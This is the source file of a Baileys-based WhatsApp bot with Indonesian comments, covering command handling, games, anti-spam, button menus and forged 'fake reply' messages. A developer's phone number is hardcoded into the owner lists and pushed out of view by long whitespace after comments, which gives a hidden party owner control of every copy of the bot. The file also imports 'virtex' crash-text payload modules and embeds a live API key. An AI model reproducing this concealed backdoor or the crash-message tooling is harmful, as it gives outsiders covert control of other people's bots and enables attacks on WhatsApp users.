const
	{
		WAConnection: _WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		ReconnectMode,
		WAMessageProto,
		ProxyAgent,
		ChatModification,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		processTime,
		relayWAMessage,
		device,
		Browsers,
		DataView,
        TypedArray,
	} = require("@adiwajshing/baileys")
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const speed = require('performance-now')
const request = require('request');
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const axios = require("axios")
const util = require('util')
const ffmpeg = require('fluent-ffmpeg')
const { EmojiAPI } = require("emoji-api");
const ig = require('insta-fetcher')
const emoji = new EmojiAPI()
const fetch = require('node-fetch');
const phoneNum = require('awesome-phonenumber')
const gis = require('g-i-s');
const got = require("got");
const os = require('os')
const imageToBase64 = require('image-to-base64');
const ID3Writer = require('browser-id3-writer');		
const brainly = require('brainly-scraper')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const { error } = require("qrcode-terminal")
const FormData = require('form-data')
const qrkode = require("qrcode")
const cheerio = require('cheerio')
const ggs = require('google-it')
const zalgo = require('./lib/zalgo')
const ameClient = require("amethyste-api")
const ameApi = new ameClient("1f486b04b157f12adf0b1fe0bd83c92a28ce768683871d2a390e25614150d0c8fa404fd01b82a5ebf5b82cbfa22e365e611c8501225a93d5d1e87f9f420eb91b")
const tod = require('tod-api');
const primbon = require('primbon-scraper')
const RA = require('ra-api')


// stickwm
const Exif = require('./lib/exif');
const exif = new Exif();




 //******************* LIB FILE ********************\\
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color.js')
const hx = require("./lib/hxz-api")
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const { styleText, baseURI, ytsr, yta, ytv, igdl, upload, buffer2Stream, stream2Buffer, noop, ythd, formatDate} = require('./lib/ytdl')
const afk = JSON.parse(fs.readFileSync('./lib/off.json'))
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
const voting = JSON.parse(fs.readFileSync('./lib/voting.json'))
const { addVote, delVote } = require('./lib/vote')
const { hentong, sewabot, donasi, help, help2, info1} = require('./message')
const { msgFilter } = require('./lib/antispam')
const { uploadFile1Day, RESTfulAPI, uptotele, uploadimg, uploadFile, uploadImages } = require('./lib/uploadimage')
const { recognize } = require('./lib/ocr')
const { y2mateA, y2mateV } = require('./lib/y2mate')
const simple = require("./lib/simple.js");
const WAConnection = simple.WAConnection(_WAConnection)
const client = new WAConnection()
const reminder = require("./lib/reminder");
const { buggc } = require('./lib/antibuggc.js')
const { wikiSearch } = require('./lib/wiki.js')
const _prem = require("./lib/premium");
const _sewa = require('./lib/sewa')
const game = require("./lib/game");
const { isLimit, limitAdd, getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("./lib/limit");
const { extream, bad, menu, tekssalah, katahai, katamalem, katasiang, katasore, katalopyou, teksbanned, tekscmd, teksspam, ilhamberkata, ngebucin, badud, ohayo, salam, thanks} = require("./message/messages.js");
const { pShadow,pRomantic,pSmoke,pBurnPapper,pNaruto,pLoveMsg,pMsgGrass,pGlitch,pDoubleHeart,pCoffeCup,pLoveText,pButterfly } = require('./lib/photooxy')
const { mediafireDl } = require('./lib/mediafire')
const  { onGoing, dadu, asupan } = require("./lib/otakudesu")
const joox = require('./lib/scrape_joox')
const translate = require('./lib/translate')




//recode sendiri
const { addCommands, checkCommands, deleteCommands } = require('./lib/commands')
const { addSpam, unSpam, SpamExpired, cekSpam} = require("./lib/spammer");
const { addSpammer, unSpammer, SpammerExpired, cekSpammer} = require("./lib/antispammer");
const { addBadword, delBadword, isKasar, addCountKasar, isCountKasar, delCountKasar } = require("./lib/badword.js");
const { addBanned, unBanned, cekBannedUser } = require("./lib/banned");
const { addError, deleteError, checkError } = require("./lib/totalerror");
const { addblockcmd, deleteblockcmd, checkblockcmd } = require("./lib/blockcmd");
const { addBlock, unBlock, cekBlock } = require("./lib/blockuser");
const { ucapsalamikum, enggakmau, ucapmalam, ucapsiang, ucappagi, botz, unregister, ucaphai, toxicbro, spamnih, loplop } = require("./message/ninamess");




 //******************* VIRTEX FILE ********************\\
//virtex by tsukasa
const { virtex, virtag, philip, emoji1, emoji2, virtex2, virtex3, virtex4, virtex5, virtex8, virtex9, virtex10, virtex11, virtex12, slayer, ngazap, virtexbytsukasa } = require('./virtex/virtex.js')
const { virtex6 } = require('./virtex/virtex6.js')
const { virtex7 } = require('./virtex/virtex7.js')
const { antivirus } = require('./virtex/antivirus.js')

           






 //******************* JSON FILE ********************\\
const { _scommand, antilink, antivirtex, commandsDB, setiker, audionye, musiknye, imagenye, videonye, bancht, spamkuyy, grupbadword, senbadword, ban, badword } = require("./message/jsonfile");
const { listcmdblock, mute, _reminder, antihidetg, antivo, kickarea, welkom, antibug, settings, listerror, balance, limit, glimit, premium, _claim, sewa, user } = require("./message/jsonfile");
const { nsfw, blocked,hitnya,spamBan,linkgcnya,siminya,antidel } = require("./message/jsonfile");




 //******************* STICKER PACK ********************\\
const { buaned, gaboleh, spam1, spam2, istigfar, hah, hanyaadmin, jadiinadmin, oketunggu, done, emror, jotos, apaantuh, ucapsalam, samasama, kumsalam, ketikmenu } = require("./message/stickerPack.js");

 //******************* FILE PHOTO ********************\\
const virgam = fs.readFileSync('./stik/virgam.jpeg');
const davizin = fs.readFileSync('./stik/davizinmaker.jpg')
const girl = fs.readFileSync('./stik/trava.jpg');
const thumb = fs.readFileSync('./stik/thumb.jpeg')
const fakethumbnail = fs.readFileSync('./stik/fake.jpeg')










version = "2.1.5"
katalog = settings.katalogMenu
troli = settings.troliMenu
Lokasi = settings.lokasiMenu
dokumen = settings.documentMenu
Anticall = settings.Anticall
fake1 = settings.copyright
namalu = settings.namalu
publik = settings.publik
namaDocument = settings.namaDocument
ephemeral = false
totalForward = settings.totalForward
prefa = settings.prefix
multi = settings.multi
forwarding = settings.forwarding
onepref  = settings.onepref
nopref = false
offline = false
ytweb = true
autoblockcmd = settings.autoblockcmd
autobio = settings.autobio
typing= settings.typing
autoread = settings.autoread
autovn = settings.autovn
antibugtroli = settings.antitroli
targetpc = '0'
nomerOwner = settings.nomerlu
nomerbot = settings.nomerbot
fake = settings.namabot
numbernye = '0'
let tebakgambar = []; //JAN UBAH
let family100 = []; //JAN UBAH
let mtk = []; //JAN UBAH 
let tebaklirik = [];  
let siapaaku = [];
let tebakkata = [];
let tebakkimia = [];
let tebakbendera = [];
let tebakanime = [];
let caklontong = []
waktu = '-'
alasan = '-'
listjadibot1 = [];
jeda = false
gamewaktu = settings.gamewaktu
limitCount = settings.limitCount
sendbug = false
teksChat = settings.teksChat
chatBot = settings.chatBot
gender = settings.gender
autosticker = settings.autosticker
autorespon = settings.autorespon 
copyright = `© ${fake1}`






 //******************* API KEY ********************\\
lolkey = settings.lolkey
xteam = settings.xteam



const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    _scommand.push(obj)
    fs.writeFileSync('./database/scommand.json', JSON.stringify(_scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return _scommand[position].chats
    }
}


const checkSCommand = (id) => {
    let status = false
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            status = true
        }
    })
    return status
}




























 let d = new Date
				let locale = 'id'
				let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
				let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
				let week = d.toLocaleDateString(locale, { weekday: 'long' })
				let calender = d.toLocaleDateString(locale, {
				day: 'numeric',
				month: 'long',
				year: 'numeric'
				})



function monospace(string) {
             return '```' + string + '```'
             }   
             function jsonformat(string) {
             return JSON.stringify(string, null, 2)
             }
             function randomNomor(angka){
             return Math.floor(Math.random() * angka) + 1
             }
             const nebal = (angka) => {
             return Math.floor(angka)
             }



   


/*           Recodenya yang teliti ya sayang                                                                              */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Ownerin ="6285156137901@s.whatsapp.net"
/*           ntar klo error jangan salahin gua                                                               */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             ownerNumber = [`6285156137901@s.whatsapp.net`,`${nomerOwner}@s.whatsapp.net`,`${nomerbot}@s.whatsapp.net`]
//=================================================//
module.exports = xdev = async (xdev, dev, baterai) => {
	try {
        if (!dev.hasNewMessage) return 
        dev = dev.messages.all()[0]
		if (!dev.message) return                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
		if (dev.key && dev.key.remoteJid == 'status@broadcast') return
		const m = simple.smsg(xdev, dev);
		const senderr = m.sender.split`@`[0]
		const cot = dev.key.fromMe ? xdev.user.jid : xdev.contacts[dev.key.fromMe ? xdev.user.jid : dev.key.remoteJid.endsWith('@g.us') ? dev.participant : dev.key.remoteJid] || { notify: jid.replace(/@.+/, '') }
        const pushnem = dev.key.fromMe ? xdev.user.name : cot.notify || cot.vname || cot.name || '-'
        const sent = dev.key.fromMe ? xdev.user.jid : dev.key.remoteJid.endsWith('@g.us') ? dev.participant : dev.key.remoteJid
		const theOwner = Ownerin.includes(sent)
		const isowner = ownerNumber.includes(sent)
		const metaData = dev.key.remoteJid.endsWith('@g.us')  ? await xdev.groupMetadata(dev.key.remoteJid) : ''
		const memberGroup = dev.key.remoteJid.endsWith('@g.us')  ? metaData.participants : ''
		const botAdmins = dev.key.remoteJid.endsWith('@g.us') ? getGroupAdmins(memberGroup) : ''
		const adminGroup = botAdmins.includes(sent) || false
		const isBotAdmins = botAdmins.includes(xdev.user.jid) || false
		const Antibuggc = dev.key.remoteJid.endsWith('@g.us')  ? antibug.includes(dev.key.remoteJid) : false
		
		
	     //Antibuggc edited  by official dittaz, thanks to Mbb, Memans and Manik
	    if(Antibuggc && dev.key.remoteJid.endsWith('@g.us')){
	    if(Object.keys(dev.message)[0] === 'ephemeralMessage' && JSON.stringify(dev.message).includes('EPHEMERAL_SETTING') && dev.message.ephemeralMessage.message.protocolMessage.type === 3){ 
		if(adminGroup) return xdev.sendMessage(dev.key.remoteJid, 'Admin grup mah bebas main buggc yekan 😎🤣', MessageType.text)
	    if(isowner) return xdev.sendMessage(dev.key.remoteJid, 'Owner mah bebas ngebug yekan 😎🤣', MessageType.text)
        xdev.sendMessage(dev.key.remoteJid, buggc(senderr,pushnem), MessageType.text)
        if(!isBotAdmins) return 
        await xdev.groupRemove(dev.key.remoteJid, [sent]);
		}
		}
		
		
        
        
        dev.message = (Object.keys(dev.message)[0] === 'ephemeralMessage') ? dev.message.ephemeralMessage.message : dev.message        
        me = xdev.user
        const antibot = m.isBaileys
        const content = JSON.stringify(dev.message)
		const from = dev.key.remoteJid
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const type = Object.keys(dev.message)[0]        
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		//const cmd = (type === 'conversation' && dev.message.conversation) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text ? dev.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
		const cmd = (type === 'conversation' && dev.message.conversation) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text ? dev.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(dev.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
        var pes = (type === 'conversation' && dev.message.conversation) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text ? dev.message.extendedTextMessage.text : ''
        const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
        const messagesC = pes.slice(0).trim()
        
         if (multi){
		 var prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
        } else {
        if (nopref){
         prefix = ''
         } else {
          prefix = prefa
         }
         }  
        const body = (type === 'conversation' && dev.message.conversation.startsWith(prefix)) ? dev.message.conversation : (type == 'imageMessage') && dev.message[type].caption.startsWith(prefix) ? dev.message[type].caption : (type == 'videoMessage') && dev.message[type].caption.startsWith(prefix) ? dev.message[type].caption : (type == 'extendedTextMessage') && dev.message[type].text.startsWith(prefix) ? dev.message[type].text : (type == 'listResponseMessage') && dev.message[type].singleSelectReply.selectedRowId ? dev.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && dev.message[type].selectedButtonId ? dev.message[type].selectedButtonId : (type == 'stickerMessage') && (getCmd(dev.message[type].fileSha256.toString('base64')) !== null && getCmd(dev.message[type].fileSha256.toString('base64')) !== undefined) ? getCmd(dev.message[type].fileSha256.toString('base64')) : ""
        //body = (type === 'listResponseMessage' && dev.message.listResponseMessage.title) ? dev.message.listResponseMessage.title : (type === 'buttonsResponseMessage' && dev.message.buttonsResponseMessage.selectedButtonId) ? dev.message.buttonsResponseMessage.selectedButtonId : (type === 'conversation' && dev.message.conversation.startsWith(prefix)) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption.startsWith(prefix) ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption.startsWith(prefix) ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text.startsWith(prefix) ? dev.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) : ""
		const budy = (type === 'conversation') ? dev.message.conversation : (type === 'extendedTextMessage') ? dev.message.extendedTextMessage.text : ''
        button = (type == 'buttonsResponseMessage') ? dev.message.buttonsResponseMessage.selectedDisplayText : ''
        listmes = (type == 'listResponseMessage') ? dev.message.listResponseMessage.title : ''
        global.prefix
		const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()		
		//const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
        const c = args.join(" ")
		const timeWib = moment().tz('Asia/Jakarta').format('HH:mm:ss')
		const timeWit= moment().tz('Asia/Makassar').format('HH:mm:ss')
        const timeWita = moment().tz('Asia/Jayapura').format('HH:mm:ss')
		const botNumber = xdev.user.jid
		const botNumberss = xdev.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		const sender = dev.key.fromMe ? xdev.user.jid : isGroup ? dev.participant : dev.key.remoteJid
		const senderNumber = sender.split("@")[0] 
		const isOwner = ownerNumber.includes(sender)
		const isClaimOn = _claim.includes(sender)
		const totalchat = await xdev.chats.all()
		const groupMetadata = isGroup ? await xdev.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
        const conts = dev.key.fromMe ? xdev.user.jid : xdev.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = dev.key.fromMe ? xdev.user.name : conts.notify || conts.vname || conts.name || '-'
        chatss = (type === 'conversation') ? dev.message.conversation : (type === 'extendedTextMessage') ? dev.message.extendedTextMessage.text : ''
        const forward = { forwardingScore: totalForward, isForwarded: forwarding, sendEphemeral: ephemeral}
        const tescuk = ["0@s.whatsapp.net"]
        const isSpammerr = cekSpammer(sender, spamkuyy)
        const isUser = user.includes(sender)
        const isBanned = cekBannedUser(sender, ban)
        const isSpamBan = cekSpam(sender, spamBan)
        const timestampp = speed();
	    const latensi = speed() - timestampp
        const arg = budy.slice(command.length + 2, budy.length)
        const atibot = dev.isBaileys
        const gcounti = settings.gcount
        
   






//VN saat ada yg maggil bot
const iyakak = botz[Math.floor(Math.random() * botz.length)]              
const ucapbot = fs.readFileSync(iyakak)

//Vn saat command tidak ditemukan
const unreg = unregister[Math.floor(Math.random() * unregister.length)]              
const gakada = fs.readFileSync(unreg)

//VN saat ada yang bilang halo
const ucapannih = ucaphai[Math.floor(Math.random() * ucaphai.length)]              
const ucapanya = fs.readFileSync(ucapannih)

//VN saat ada yang toxic
const anying = toxicbro[Math.floor(Math.random() * toxicbro.length)]              
const astaga = fs.readFileSync(anying)

//VN saat ada yg akses fitur owner
const ahenggak = enggakmau[Math.floor(Math.random() * enggakmau.length)]              
const gakmau = fs.readFileSync(ahenggak)

//VN saat ada yg bilang selamat pagi
const ay = ucappagi[Math.floor(Math.random() * ucappagi.length)]
const oahyo = fs.readFileSync(ay)

//VN saat ada yg bilang selamat malam
const ayuk = ucapmalam[Math.floor(Math.random() * ucapmalam.length)]
const oyasumi = fs.readFileSync(ayuk)

//VN saat ada yg bilang selamat siang
const yayuk = ucapsiang[Math.floor(Math.random() * ucapsiang.length)]
const koniciwa = fs.readFileSync(yayuk)

//VN saat ada yg spam
const alal = spamnih[Math.floor(Math.random() * spamnih.length)]
const nospam = fs.readFileSync(alal)

//VN saat ada yg bilang halo
const ulul = ucaphai[Math.floor(Math.random() * ucaphai.length)]
const moshimos = fs.readFileSync(ulul)

//VN saat ada yg bilang asalamualaikum
const alul = ucapsalamikum[Math.floor(Math.random() * ucapsalamikum.length)]
const walaikumsalam = fs.readFileSync(alul)

//VN saat ada yg bilang i love u
const awlu = loplop[Math.floor(Math.random() * loplop.length)]
const lopyoutoo = fs.readFileSync(awlu)

//cari teman
const teman = user[Math.floor(Math.random() * user.length)]



//Teks untuk pertanyaan game yg salah
const jawabansalah = tekssalah[Math.floor(Math.random() * tekssalah.length)]
           
const textcmd = tekscmd[Math.floor(Math.random() * tekscmd.length)]                         
const textspam = teksspam[Math.floor(Math.random() * teksspam.length)]                         
const textbanned = teksbanned[Math.floor(Math.random() * teksbanned.length)]



        

        
  
        
 //******************* 》ACTIVATED SECURITY《 ********************\\
        const Toxic = isGroup ? grupbadword.includes(from) : false
        const isBanchat = isGroup ? bancht.includes(from) : false
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
        const isVote = isGroup ? voting.includes(from) : false
        const isAntiLink = isGroup ? antilink.includes(from) : false
        const AntiVirtex = isGroup ? antivirtex.includes(from) : false
        const isAntilinkGc = isGroup ? linkgcnya.includes(from) : false        
        const isMuted = isGroup ? mute.includes(from) : false
        const isAntihidetag = isGroup ? antihidetg.includes(from) : false;
        const isAntiviewonce = isGroup ? antivo.includes(from) : false;
        const isKickarea = isGroup ? kickarea.includes(from) : false;
        const isWelkom = isGroup ? JSON.parse(fs.readFileSync('./database/welkom.json')).includes(from) : false
        const isExtream = isGroup ? extream.includes(from) : false
        const isSimi = isGroup ? siminya.includes(from) : false
        const isAntidel = isGroup ? antidel.includes(from) : false
        const isSewa =  _sewa.checkSewaGroup(from, sewa)
        const isPremium = isOwner ? true : _prem.checkPremiumUser(sender, premium)
        const gcount = isPremium ? gcounti.prem : gcounti.user
       const isNsfw = isGroup ? nsfw.includes(from) : false;











 //******************* 》MESSGAGE RESPON《 ********************\\
		mess = {
			banned: 'anda telah dibanned 😎',
			wait: 'Tunggu sebentar ya kak',
			search: 'Searching...',
			admin: 'Kusus admin',
			owner: 'Kusus owner',
			success: 'Berhasil!',
			limit: `[❕] Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`,
            eror: 'Eror To Again',
            claimOnAlready: `Kamu sudah melakukan claim sebelumnya, Harap claim lagi di esok hari.`,
			wrongFormat: 'Format salah, coba liat lagi di menu',
			error: {
				stick: 'bukan sticker itu:v',
				api: 'Error api atau linkya mungkin',
				Iv: 'Linknya error:v'
			},
			only: {
            prem : 'Premium special features! Chat owner to get Premium access!',
            group: 'Fitur Dapat digunakan di Dalam Group!',
            ownerG: 'Fitur Dapat digunakan oleh Owner Group!',
            ownerB: 'Fitur Khusus Owner Bot!',
            admin: 'Fitur dapat Digunakan oleh Admin Group!',
            Badmin: 'Fitur dapat Digunakan Setelah Bot menjadi ADMIN!'
            }
            }
            
		const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }
        
        
if(timeWib < "23:59:00"){
var ucapanWaktu = 'Selamat malam'
                                        }
if(timeWib < "19:00:00"){
var ucapanWaktu = 'Selamat malam'
                                         }
if(timeWib < "18:00:00"){
var ucapanWaktu = 'Selamat sore'
                                         }
if(timeWib < "15:00:00"){
var ucapanWaktu = 'Selamat siang'
                                         }
if(timeWib < "11:00:00"){
var ucapanWaktu = 'Selamat pagi'
                                         }
if(timeWib < "06:00:00"){
var ucapanWaktu = 'Selamat pagi'  }
            
        
        
        
        
        
        
 //******************* 》FAKE REPLY《 ********************\\
   
        //FAKEREPLY PRODUCT 
            const ftoko = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": fs.readFileSync(`./stik/fake.jpeg`)},"title": `${pushname}`,"description": `${ucapanWaktu} kak`, "retailerId": `「 audio 」 `,"productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}
            //FAKE KONTAK
            const fkontak = { 
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
            //FAKE STICKER
            const fsticker = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},"message": {"stickerMessage": { "url": "https://mmg.whatsapp.net/d/f/Am6FBfNf-E2f1VoGBXkPaNAy7L6Tw_HMavKrHEt48QM4.enc","fileSha256": "Yfj8SW7liSEnDakvyVlXVZQ1LJBC9idn09X7KHe8HTc=","fileEncSha256": "F854aUrzgAkBTOVULpne4oSIi6S04Jo56pjZEo+p+9U=","mediaKey": "Z3nA2asclAAwWHngNO/vJ81qxOE2/0gkEnXak+NxPV4=","mimetype": "image/webp","height": 64,"width": 64,"directPath": "/v/t62.15575-24/12097272_1193895144391295_8973688483514349023_n.enc?ccb=11-4&oh=5a9d7147627a8355569f1a641b9ebee3&oe=60C65E73","fileLength": "7186","mediaKeyTimestamp": "1622815545","isAnimated": false}}}
            //FAKE VN
            const fvn = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds": "9999999","ptt": "true"}}}
            //FAKE TEXT
            const ftext = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${fake}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
            //FAKE LIVE ACTION
            const floc2 = {
                  key: {"fromMe": false,"participant": `0@s.whatsapp.net`, "remoteJid": "6289530863358-1621036495@g.us" },message: { "liveLocationMessage": { "title":`${fake}`,}}}
            //FAKEREPLY TROLI
            const ftroli = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : 2021,status: 1,surface : 2,message: `${fake}\n${ucapanWaktu} kak`,orderTitle: `${ucapanWaktu} kak`,thumbnail: fs.readFileSync('./stik/thumb.jpeg'), sellerJid: `0@s.whatsapp.net`}}}
            //FAKEREPLY VIDEO
            const fvideo = {
                  key: {fromMe: false,participant: `62895619083555@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":"hallo bang","h": `Hmm`,'seconds': '-99999', 'caption': `${fake}`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
            //FAKEREPLY GROUPINVITE
            const fgc = {
                  key: {"fromMe": false,"participant": "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "62895619083555-1616169743@g.us","inviteCode": "mememteeeekkeke","groupName": "P", "caption": `${fake}`, 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
            //FAKEREPLY GIF
            const fgif = {
                  key: {fromMe: false,participant: `6285842369183@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":"hallo bang","h": `Hmm`,'seconds': '99999', 'gifPlayback': 'true', 'caption': `${fake}`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}} 
            //FAKEREPLY menu
            
            
            
            
               //SENDKONTAK
       const sendKontak = (from, nomor, nama, org = "") => {
      const vcard =
        "BEGIN:VCARD\n" +
        "VERSION:3.0\n" +
        "FN:" +
        nama +
        "\n" +
        "ORG:" +
        org +
        "\n" +
        "TEL;type=CELL;type=VOICE;waid=" +
        nomor +
        ":+" +
        nomor +
        "\n" +
        "END:VCARD";
      xdev.sendMessage(
        from,
        { displayname: nama, vcard: vcard },
        MessageType.contact,
        { quoted: dev }
      );
    };




   






//******************* 》BUTTON CMD《 ********************\\
   
///Button Text
const sendButMessage = (id, text1, desc1, but = []) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1,
}
xdev.sendMessage(id, buttonMessage, MessageType.buttonsMessage, {quoted: ftroli})
}
///Button Image
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await xdev.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: `*${fake}*\n` + text1,
footerText: desc1,
buttons: but,
headerType: 4
}
xdev.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Video
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await xdev.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
xdev.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Location
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
					kma = gam1
					mhan = await xdev.prepareMessage(id, kma, MessageType.location, {thumbnail:kma})
					buttonMessages = {
						locationMessage: mhan.message.locationMessage,
						contentText: `*${fake}*`+text1,
						footerText: desc1,
						buttons: but,
						headerType: 6
						}
						xdev.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
						}
//Button ocument
const Sendbutdocument = async(id, text1, desc1, file1, doc1, but = [], options = {}) => {
media = file1
kma = doc1
mhan = await xdev.prepareMessage(from, media, document, kma)
const buttonMessages = {
documentMessage: mhan.message.documentMessage,
contentText: `*${fake}*`+text1,
footerText: desc1,
buttons: but,
headerType: "DOCUMENT"
}
xdev.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
//Katalog menu
const sendKatalog = async (deskripsi ) => {   
               hmm4 = fs.readFileSync('./stik/thumb.jpeg')
               imeu =  await xdev.prepareMessage('0@s.whatsapp.net', hmm4, image, { thumbnail : fs.readFileSync(`./stik/fake.jpeg`)}), 
                imeg = imeu.message.imageMessage
                   res =  await xdev.prepareMessageFromContent(from, {
                        'productMessage': {
                            'product': {
                           'productImage': imeg,
                                'productId': 'IDR',
                                'title': fake,
                                'description': deskripsi,
                                'retailerId': copyright,
                                'itemCount': 2021,
                                'priceAmount1000': '1000',
                                'descriptionCount': 1,
